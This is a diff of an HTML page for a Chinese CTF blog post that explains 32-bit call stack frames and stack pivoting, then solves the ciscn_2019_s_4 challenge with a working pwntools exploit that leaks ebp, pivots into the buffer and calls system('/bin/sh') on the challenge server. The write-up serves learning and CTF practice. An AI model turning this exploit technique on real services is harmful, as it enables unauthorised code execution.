+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
 </header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
 <main class="main">
-
-<article class="post-single">
-  <header class="post-header">
-    <div class="breadcrumbs"><a href="https://zeroy.site/">Home</a>&nbsp;»&nbsp;<a href="https://zeroy.site/articles/">Articles</a></div>
-    <h1 class="post-title">
-      [PWN.0x00]函数调用栈结构与栈迁移
-    </h1>
-    <div class="post-meta"><span title='2022-03-05 20:30:31 +0800 CST'>March 5, 2022</span>&nbsp;·&nbsp;zeroy
-
-</div>
-  </header> <div class="toc">
-    <details >
-        <summary accesskey="c" title="(Alt + C)">
-            <span class="details">Table of Contents</span>
-        </summary>
-
-        <div class="inner"><ul>
-                <li>
-                    <a href="#%e5%87%bd%e6%95%b0%e8%b0%83%e7%94%a8%e6%a0%88%e7%9a%84%e5%9f%ba%e6%9c%ac%e7%bb%93%e6%9e%84" aria-label="函数调用栈的基本结构">函数调用栈的基本结构</a></li>
-                <li>
-                    <a href="#%e6%a0%88%e8%bf%81%e7%a7%bb" aria-label="栈迁移">栈迁移</a></li>
-                <li>
-                    <a href="#%e4%be%8b%e9%a2%98ciscn_2019_s_4" aria-label="例题：ciscn_2019_s_4">例题：ciscn_2019_s_4</a>
-                </li>
-            </ul>
-        </div>
-    </details>
-    
-</div>
-
-  <div class="post-content"><p><strong>前置知识：</strong><a href="https://book.douban.com/subject/35038473/">汇编语言（第4版）</a>前半本</p>
+            <div class="container"><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "false")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[PWN.0x00]函数调用栈结构与栈迁移</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="zeroy.site" title="Author" rel=" author" class="author">zeroy</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/pwn/"><i class="far fa-folder fa-fw"></i>PWN</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-03-05">2022-03-05</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-03-05">2022-03-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1629 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="true">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#函数调用栈的基本结构">函数调用栈的基本结构</a></li>
+            <li><a href="#栈迁移">栈迁移</a></li>
+            <li><a href="#例题ciscn_2019_s_4">例题：ciscn_2019_s_4</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="details admonition note open">
+                <div class="details-summary admonition-title">
+                    <i class="icon fas fa-pencil-alt fa-fwnote"></i>注意<i class="details-icon fas fa-angle-right fa-fw"></i>
+                </div>
+                <div class="details-content">
+                    <div class="admonition-content">
+                        本文最后更新于 <span class="timeago" datetime="2022-03-05T20:30:31" title="March 5, 2022">2022-03-05</span>，文中内容可能已过时。</div>
+                </div>
+            </div><p><strong>前置知识：</strong><a href="https://book.douban.com/subject/35038473/" target="_blank" rel="noopener noreferrer">汇编语言（第4版）</a>前半本</p>
 <blockquote>
 <p>注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。<strong>示意图中leave均表示leave|ret</strong></p>
 </blockquote>
-<h4 id="函数调用栈的基本结构">函数调用栈的基本结构<a hidden class="anchor" aria-hidden="true" href="#函数调用栈的基本结构">#</a></h4>
-<p><strong>一些寄存器的作用：</strong></p>
+<h4 id="函数调用栈的基本结构" class="headerLink">
+    <a href="#%e5%87%bd%e6%95%b0%e8%b0%83%e7%94%a8%e6%a0%88%e7%9a%84%e5%9f%ba%e6%9c%ac%e7%bb%93%e6%9e%84" class="header-mark"></a>函数调用栈的基本结构</h4><p><strong>一些寄存器的作用：</strong></p>
 <p>EIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。</p>
 <p>EBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。</p>
 <p>ESP：始终指向栈顶。</p>
 <p>在进入一个函数时，会执行如下操作。</p>
-<pre tabindex="0"><code class="language-assembly" data-lang="assembly">push eip+4
-push ebp
-mov ebp,esp
-</code></pre><p>在执行完退出时，会执行如下操作。</p>
-<pre tabindex="0"><code class="language-assembly" data-lang="assembly">mov esp,ebp
-pop ebp
-
-pop eip
-</code></pre><p>即leave和ret。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">push eip+4
+</span></span><span class="line"><span class="cl">push ebp
+</span></span><span class="line"><span class="cl">mov ebp,esp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在执行完退出时，会执行如下操作。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mov esp,ebp
+</span></span><span class="line"><span class="cl">pop ebp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pop eip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>即leave和ret。</p>
 <p>整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip+4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。</p>
 <p>函数调用栈工作时的结构如下图：</p>
-<p><img loading="lazy" src="1.svg" alt=""  />
-</p>
+<p><figure><a class="lightgallery" href="1.svg" title="1.svg" data-thumbnail="1.svg">
+        <img
+            
+            loading="lazy"
+            src="1.svg"
+            srcset="1.svg, 1.svg 1.5x, 1.svg 2x"
+            sizes="auto"
+            alt="1.svg">
+    </a></figure></p>
 <p>其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">func</span>(<span style="color:#66d9ef">int</span> a){
-    <span style="color:#66d9ef">int</span> b,c;
-    <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">10</span>];
-}
-</code></pre></div><p>这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。</p>
 <p>考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。</p>
 <p>但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。</p>
-<h4 id="栈迁移">栈迁移<a hidden class="anchor" aria-hidden="true" href="#栈迁移">#</a></h4>
-<p>栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。</p>
+<h4 id="栈迁移" class="headerLink">
+    <a href="#%e6%a0%88%e8%bf%81%e7%a7%bb" class="header-mark"></a>栈迁移</h4><p>栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。</p>
 <p>也就是说，要构造栈中数据如图所示：</p>
-<p><img loading="lazy" src="2.svg" alt="2"  />
-</p>
+<p><figure><a class="lightgallery" href="2.svg" title="2" data-thumbnail="2.svg">
+        <img
+            
+            loading="lazy"
+            src="2.svg"
+            srcset="2.svg, 2.svg 1.5x, 2.svg 2x"
+            sizes="auto"
+            alt="2.svg">
+    </a></figure></p>
 <p>至于为什么要-4，后面模拟的过程中读者自能体会。</p>
 <p>好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图：</p>
-<p><img loading="lazy" src="3.svg" alt="3"  />
-</p>
+<p><figure><a class="lightgallery" href="3.svg" title="3" data-thumbnail="3.svg">
+        <img
+            
+            loading="lazy"
+            src="3.svg"
+            srcset="3.svg, 3.svg 1.5x, 3.svg 2x"
+            sizes="auto"
+            alt="3.svg">
+    </a></figure></p>
 <p>然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图：</p>
-<p><img loading="lazy" src="4.svg" alt="4"  />
-</p>
+<p><figure><a class="lightgallery" href="4.svg" title="4" data-thumbnail="4.svg">
+        <img
+            
+            loading="lazy"
+            src="4.svg"
+            srcset="4.svg, 4.svg 1.5x, 4.svg 2x"
+            sizes="auto"
+            alt="4.svg">
+    </a></figure></p>
 <p>这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。</p>
-<h4 id="例题ciscn_2019_s_4">例题：ciscn_2019_s_4<a hidden class="anchor" aria-hidden="true" href="#例题ciscn_2019_s_4">#</a></h4>
-<p><a href="https://buuoj.cn/challenges#ciscn_2019_s_4">BUUCTF在线评测 (buuoj.cn)</a></p>
+<h4 id="例题ciscn_2019_s_4" class="headerLink">
+    <a href="#%e4%be%8b%e9%a2%98ciscn_2019_s_4" class="header-mark"></a>例题：ciscn_2019_s_4</h4><p><a href="https://buuoj.cn/challenges#ciscn_2019_s_4" target="_blank" rel="noopener noreferrer">BUUCTF在线评测 (buuoj.cn)</a></p>
 <p>所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。</p>
 <p>惯例checksec，只开了NX。</p>
 <p>ida分析得到：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">vul</span>()
-{
-  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [esp+0h] [ebp-28h] BYREF
-</span><span style="color:#75715e"></span>  memset(buf, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x20u</span>);
-  read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x30u</span>);
-  printf(<span style="color:#e6db74">&#34;Hello, %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
-  read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x30u</span>);
-  <span style="color:#66d9ef">return</span> printf(<span style="color:#e6db74">&#34;Hello, %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
-}
-</code></pre></div><p>发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">vul</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [esp+0h] [ebp-28h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x20u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x30u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello, %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x30u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello, %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。</p>
 <p>第一次读满0x28个字节，由于printf输出的时候会一直输出到\x00为止，所以会把ebp也一起输出来。</p>
 <p>在第二次输入的时候构造一个栈迁移的结构，将栈迁移到我们能控制的buf段。</p>
-<p><img loading="lazy" src="5.svg" alt="5"  />
-</p>
+<p><figure><a class="lightgallery" href="5.svg" title="5" data-thumbnail="5.svg">
+        <img
+            
+            loading="lazy"
+            src="5.svg"
+            srcset="5.svg, 5.svg 1.5x, 5.svg 2x"
+            sizes="auto"
+            alt="5.svg">
+    </a></figure></p>
 <p>结合文章开头函数调用栈的知识，不难理解，&lsquo;bin/sh&rsquo;和buf_addr+12都将作为输入的参数输入到system函数中，所以程序最终执行的效果就是获取了shell。</p>
 <p>注意到我们需要填入的信息中需要我们预先知道buf的地址，可以在本地动态调试（gdb）中获取ebp和buf地址的差值，然后作差得到。<strong>不要想当然地认为buf和ebp的差值就是0x28，这只是在read函数中的情况，此处的ebp指的是vul函数中的ebp，即read函数中ebp指向的oldebp。</strong></p>
 <p>EXP：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> psutil <span style="color:#f92672">import</span> process_iter
-<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;i386&#34;</span>,log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;debug&#34;</span>)
-op<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
-e<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#34;ciscn-s-4.bin&#34;</span>)
-sys_addr<span style="color:#f92672">=</span>e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
-leave_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x080484B8</span>
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-    <span style="color:#66d9ef">if</span> op<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:
-        zeroy<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#34;ciscn-s-4.bin&#34;</span>)
-    <span style="color:#66d9ef">else</span>:
-        zeroy<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#34;node4.buuoj.cn&#34;</span>,<span style="color:#ae81ff">27827</span>)
-    payload1<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x24</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;bbbb&#34;</span>
-    zeroy<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;name?&#34;</span>)
-    zeroy<span style="color:#f92672">.</span>send(payload1)
-    zeroy<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;bbbb&#34;</span>)
-    ebp_addr<span style="color:#f92672">=</span>u32(zeroy<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))
-    print(<span style="color:#e6db74">&#34;ebp_addr: &#34;</span>,hex(ebp_addr))
-    buf_addr<span style="color:#f92672">=</span>ebp_addr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>
-    payload2<span style="color:#f92672">=</span>p32(sys_addr)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaa&#39;</span><span style="color:#f92672">+</span>p32(buf_addr<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
-    payload2<span style="color:#f92672">=</span>payload2<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x28</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)<span style="color:#f92672">+</span>p32(buf_addr<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">+</span>p32(leave_addr)
-    zeroy<span style="color:#f92672">.</span>send(payload2)
-    zeroy<span style="color:#f92672">.</span>interactive()
-main()
-</code></pre></div>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">psutil</span> <span class="kn">import</span> <span class="n">process_iter</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;i386&#34;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">op</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;ciscn-s-4.bin&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys_addr</span><span class="o">=</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">leave_addr</span><span class="o">=</span><span class="mh">0x080484B8</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">op</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">zeroy</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&#34;ciscn-s-4.bin&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">zeroy</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">27827</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload1</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x24</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;bbbb&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zeroy</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;name?&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zeroy</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zeroy</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;bbbb&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ebp_addr</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">zeroy</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ebp_addr: &#34;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">ebp_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">buf_addr</span><span class="o">=</span><span class="n">ebp_addr</span><span class="o">-</span><span class="mh">0x38</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload2</span><span class="o">=</span><span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf_addr</span><span class="o">+</span><span class="mi">12</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload2</span><span class="o">=</span><span class="n">payload2</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf_addr</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">leave_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zeroy</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zeroy</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div>
 
-  </div>
+        
 
-  <footer class="post-footer">
-<nav class="paginav">
-  <a class="prev" href="https://zeroy.site/articles/CTFpwn2/">
-    <span class="title">« </span>
-    <br>
-    <span>[PWN.0x01]canary|partial overwrite|ret2libc</span>
-  </a>
-  <a class="next" href="https://zeroy.site/articles/noya/">
-    <span class="title"> »</span>
-    <br>
-    <span>基于go-cqhttp的机器人NoyaBot</span>
-  </a>
-  
-</nav>
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-03-05</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/articles/CTFpwn1/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span><a href="#" title="分享到 Twitter" data-sharer="twitter" data-url="http://zeroy.site/articles/CTFpwn1/" data-title="[PWN.0x00]函数调用栈结构与栈迁移"><i class="fab fa-twitter fa-fw"></i></a><a href="#" title="分享到 微博" data-sharer="weibo" data-url="http://zeroy.site/articles/CTFpwn1/" data-title="[PWN.0x00]函数调用栈结构与栈迁移"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
 
-  </footer><script src="https://utteranc.es/client.js"
-        repo="zeroy0410/zeroy0410.github.io"
-        issue-term="pathname"
-        label="Comment"
-        theme="github-light"
-        crossorigin="anonymous"
-        async>
-</script>
-</article>
-    </main>
-    
-<footer class="footer">
-    <span>&copy; 2022 <a href="https://zeroy.site/">zeroy&#39;s blog</a></span>
-    <span>
-        Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
-    </span>
-</footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
-    </svg>
-</a>
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
 
-<script>
-    let menu = document.getElementById('menu')
-    if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
-        menu.onscroll = function () {
-            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
-        }
-    }
+    <div class="post-nav"><a href="/articles/noya/" class="prev" rel="prev" title="基于go-cqhttp的机器人NoyaBot"><i class="fas fa-angle-left fa-fw"></i>基于go-cqhttp的机器人NoyaBot</a>
+            <a href="/articles/CTFpwn2/" class="next" rel="next" title="[PWN.0x01]canary|partial overwrite|ret2libc">[PWN.0x01]canary|partial overwrite|ret2libc<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.111.3">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.3.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="zeroy.site" target="_blank" rel="noopener noreferrer">zeroy</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
 
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
-
-</script>
-<script>
